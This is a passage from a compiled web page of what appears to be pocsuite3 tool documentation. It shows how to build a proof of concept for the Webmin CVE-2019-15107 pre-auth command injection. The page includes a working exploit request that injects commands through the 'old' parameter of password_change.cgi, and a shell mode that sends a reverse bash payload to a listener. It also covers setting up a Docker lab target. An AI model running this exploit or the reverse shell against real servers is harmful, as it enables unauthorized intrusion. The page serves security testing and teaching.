import{_ as s,a as n,b as a}from"./chunks/poc-demo-cve-2019-15107_shell.dd95a821.js";import{_ as l,j as p,g as o,H as e}from"./chunks/framework.8815fd6f.js";const f=JSON.parse('{"title":"Webmin Unauthorized Remote Command Execution Vulnerability (CVE-2019-15107)","description":"","frontmatter":{},"headers":[{"level":2,"title":"PoC development","slug":"poc-development"},{"level":2,"title":"Preparing the vulnerable environment","slug":"preparing-the-vulnerable-environment"},{"level":2,"title":"Vulnerability verification","slug":"vulnerability-verification"}],"relativePath":"en/guide/poc-demo-cve-2019-15107.md","lastUpdated":1658474088000}'),t={name:"en/guide/poc-demo-cve-2019-15107.md"},r=e(`<h1 id="webmin-unauthorized-remote-command-execution-vulnerability-cve-2019-15107" tabindex="-1">Webmin Unauthorized Remote Command Execution Vulnerability (CVE-2019-15107) <a class="header-anchor" href="#webmin-unauthorized-remote-command-execution-vulnerability-cve-2019-15107" aria-hidden="true">#</a></h1><p>Vulnerability details: <a href="https://www.seebug.org/vuldb/ssvid-98060" target="_blank" rel="noreferrer">Webmin Unauthenticated Remote Execution</a></p><p>Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.</p><p>An issue was discovered in <code>Webmin &lt;=1.920</code>. The parameter <code>old</code> in <code>password_change.cgi</code> contains a command injection vulnerability.</p><h2 id="poc-development" tabindex="-1">PoC development <a class="header-anchor" href="#poc-development" aria-hidden="true">#</a></h2><p>Based on the details of the vulnerability disclosed on the Internet, we can easily develop the PoC of the vulnerability. First, use the <code>--new</code> parameter to generate a PoC template (if you think there are too many attributes, just press enter all the way).</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u279C pocsuite --new</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"><span style="color:#A6ACCD;">You are about to be asked to enter information that will be used to create a poc template.</span></span>
<span class="line"><span style="color:#A6ACCD;">There are quite a few fields but you can leave some blank.</span></span>
<span class="line"><span style="color:#A6ACCD;">For some fields there will be a default value.</span></span>
<span class="line"><span style="color:#A6ACCD;">-----</span></span>
<span class="line"><span style="color:#A6ACCD;">Seebug ssvid </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">0</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 98060</span></span>
<span class="line"><span style="color:#A6ACCD;">PoC author </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Seebug</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: Seebug</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability disclosure date </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 2021-8-18</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">2022-07-11</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 2019-08-19</span></span>
<span class="line"><span style="color:#A6ACCD;">Advisory URL </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.seebug.org/vuldb/ssvid-99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">https://www.seebug.org/vuldb/ssvid-98060</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability CVE number </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, CVE-2021-22123</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: CVE-2019-15107</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Fortinet</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Product or component name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, FortiWeb</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: Webmin</span></span>
<span class="line"><span style="color:#A6ACCD;">Affected version </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=6.4.0</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=1.920</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor homepage </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.fortinet.com</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: https://www.webmin.com</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: 2</span></span>
<span class="line"><span style="color:#A6ACCD;">Authentication Required </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: no</span></span>
<span class="line"><span style="color:#A6ACCD;">Can we get result of </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: yes</span></span>
<span class="line"><span style="color:#A6ACCD;">PoC name </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">Webmin </span><span style="color:#89DDFF;">&lt;=</span><span style="color:#A6ACCD;">1.920 Pre-Auth Command Execution </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">CVE-2019-15107</span><span style="color:#89DDFF;">)]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Filepath </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> which to save the poc </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">14:50:49</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Your poc has been saved </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> ./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py :)</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><p>The generated PoC template is as follows.</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#676E95;font-style:italic;">#!/usr/bin/env python3</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># It is recommended to import from pocsuite3.api</span></span>
<span class="line"><span style="color:#A6ACCD;">from pocsuite3.api import </span><span style="color:#89DDFF;">(</span></span>
<span class="line"><span style="color:#A6ACCD;">    minimum_version_required, POCBase, register_poc, requests, logger,</span></span>
<span class="line"><span style="color:#A6ACCD;">    OptString, OrderedDict,</span></span>
<span class="line"><span style="color:#A6ACCD;">    random_str,</span></span>
<span class="line"><span style="color:#A6ACCD;">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span></span>
<span class="line"><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># Limit the framework version and avoid running new PoC plugins on the old framework</span></span>
<span class="line"><span style="color:#A6ACCD;">minimum_version_required</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">1.9.6</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># DemoPOC class, inherited from the base class POCBase</span></span>
<span class="line"><span style="color:#A6ACCD;">class DemoPOC</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">POCBase</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;"># Attribute information of PoC and vulnerability</span></span>
<span class="line"><span style="color:#A6ACCD;">    vulID = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">98060</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    version = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">1</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    author = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Seebug</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    vulDate = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">2019-08-19</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    createDate = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">2022-07-11</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    updateDate = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">2022-07-11</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    references = </span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">https://www.seebug.org/vuldb/ssvid-98060</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">    name = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Webmin &lt;=1.920 Pre-Auth Command Execution (CVE-2019-15107)</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    appPowerLink = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">https://www.webmin.com</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    appName = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Webmin</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    appVersion = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&lt;=1.920</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    vulType = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Command Execution</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    desc = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Vulnerability description</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    samples = </span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">    install_requires = </span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC third party module dependency</span></span>
<span class="line"><span style="color:#A6ACCD;">    pocDesc = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">User manual of poc</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;"># Dork for search, if the target is not provided when running PoC and this field is not empty,</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;"># the plugin will be loaded to retrieve the target from the cyberspace search engine</span></span>
<span class="line"><span style="color:#A6ACCD;">    dork = {</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">zoomeye</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">: </span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#A6ACCD;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    suricata_request = </span><span style="color:#89DDFF;">&#39;&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    suricata_response = </span><span style="color:#89DDFF;">&#39;&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">	</span><span style="color:#676E95;font-style:italic;"># Define additional command line parameters for attack mode</span></span>
<span class="line"><span style="color:#A6ACCD;">    def _options</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        o = </span><span style="color:#82AAFF;">OrderedDict</span><span style="color:#89DDFF;">()</span></span>
<span class="line"><span style="color:#A6ACCD;">        o</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">cmd</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = OptString</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">uname -a</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">, description=</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">The command to execute</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> o</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">	</span><span style="color:#676E95;font-style:italic;"># The core method of vulnerability</span></span>
<span class="line"><span style="color:#A6ACCD;">    def _exploit</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self, param=</span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;"># Use self._check() method checks whether the target is alive and whether it is a keyword honeypot.</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> not self._check</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">dork=</span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        headers = {</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Content-Type</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">: </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">application/x-www-form-urlencoded</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">        payload = </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">a=b</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">        res = requests.post</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self.url, headers=headers, data=payload</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        logger.debug</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">res.text</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> res.text</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">	</span><span style="color:#676E95;font-style:italic;"># Implementation of verify mode</span></span>
<span class="line"><span style="color:#A6ACCD;">    def _verify</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        result = {}</span></span>
<span class="line"><span style="color:#A6ACCD;">        flag = random_str</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">6</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        param = f</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">echo {flag}</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">        res = self._exploit</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">param</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> res and flag </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> res:</span></span>
<span class="line"><span style="color:#A6ACCD;">            result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = {}</span></span>
<span class="line"><span style="color:#A6ACCD;">            result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">URL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = self.url</span></span>
<span class="line"><span style="color:#A6ACCD;">            result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#A6ACCD;">param</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = res</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;"># Call self.parse_output(), return the result</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self.parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">	</span><span style="color:#676E95;font-style:italic;"># Implementation of attack mode</span></span>
<span class="line"><span style="color:#A6ACCD;">    def _attack</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        result = {}</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;"># self.get_option() method can obtain customized command line parameters</span></span>
<span class="line"><span style="color:#A6ACCD;">        param = self.get_option</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">cmd</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        res = self._exploit</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">param</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">        result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = {}</span></span>
<span class="line"><span style="color:#A6ACCD;">        result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">URL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = self.url</span></span>
<span class="line"><span style="color:#A6ACCD;">        result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#A6ACCD;">param</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> = res</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;"># Call self.parse_output(), return the result</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self.parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">	</span><span style="color:#676E95;font-style:italic;"># Implementation of shell mode</span></span>
<span class="line"><span style="color:#A6ACCD;">    def _shell</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        try:</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#82AAFF;">self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip</span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;">, </span><span style="color:#82AAFF;">get_listener_port</span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;">))</span></span>
<span class="line"><span style="color:#A6ACCD;">        except Exception:</span></span>
<span class="line"><span style="color:#A6ACCD;">            pass</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># Register this PoC to the framework</span></span>
<span class="line"><span style="color:#A6ACCD;">register_poc</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">DemoPOC</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><p>Based on the above PoC template, combined with vulnerability details, rewrite <code>_exploit()</code> method.</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_exploit</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> param</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">not</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">_check</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">dork</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&lt;title&gt;Login to Webmin&lt;/title&gt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    headers </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Content-Type</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">application/x-www-form-urlencoded</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Referer</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">f</span><span style="color:#C3E88D;">&#39;</span><span style="color:#A6ACCD;">{self</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">url</span><span style="color:#A6ACCD;">}</span><span style="color:#C3E88D;">/session_login.cgi&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    payload </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">f</span><span style="color:#C3E88D;">&#39;user=rootxx&amp;pam=&amp;expired=2&amp;old=test|</span><span style="color:#A6ACCD;">{param}</span><span style="color:#C3E88D;">&amp;new1=test2&amp;new2=test2&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    res </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> requests</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">post</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">f</span><span style="color:#C3E88D;">&#39;</span><span style="color:#82AAFF;">{</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">url</span><span style="color:#82AAFF;">}</span><span style="color:#C3E88D;">/password_change.cgi&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#A6ACCD;">headers</span><span style="color:#89DDFF;">=</span><span style="color:#82AAFF;">headers</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#A6ACCD;">data</span><span style="color:#89DDFF;">=</span><span style="color:#82AAFF;">payload</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    logger</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">debug</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">res</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">text</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> res</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">text</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">split</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">The current password is incorrect</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)[-</span><span style="color:#F78C6C;">1</span><span style="color:#89DDFF;">].</span><span style="color:#82AAFF;">split</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&lt;/h3&gt;&lt;/center&gt;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)[</span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">]</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><h2 id="preparing-the-vulnerable-environment" tabindex="-1">Preparing the vulnerable environment <a class="header-anchor" href="#preparing-the-vulnerable-environment" aria-hidden="true">#</a></h2><p>Then we will set up the vulnerable environment for testing.</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u250C\u2500\u2500</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">kali\u327Fkali</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">-</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">~</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ docker run -it --rm -p 10000:10000 pocsuite3/cve-2019-15107</span></span>
